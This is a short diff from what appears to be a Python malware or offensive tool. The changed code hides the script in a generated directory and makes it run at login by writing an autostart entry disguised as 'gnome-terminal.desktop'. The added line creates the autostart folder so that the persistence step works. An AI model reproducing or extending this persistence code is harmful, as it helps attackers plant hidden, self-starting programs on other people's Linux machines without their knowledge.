@@ -147,10 +147,11 @@ if Attack == None:
     #getting location to hide the script
     newfileloc = dirgenerator()
 
+    os.system(f"mkdir -p /home/{getpass.getuser()}/.config/autostart")
+
     #using touch command so that it wont distrub if the file already exist and also creates if it doesn't exist
     os.system("touch /home/{}/.config/autostart/gnome-terminal.desktop".
               format(getpass.getuser()))
-
 
     #Add our Script to the autostart Programms.
     with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
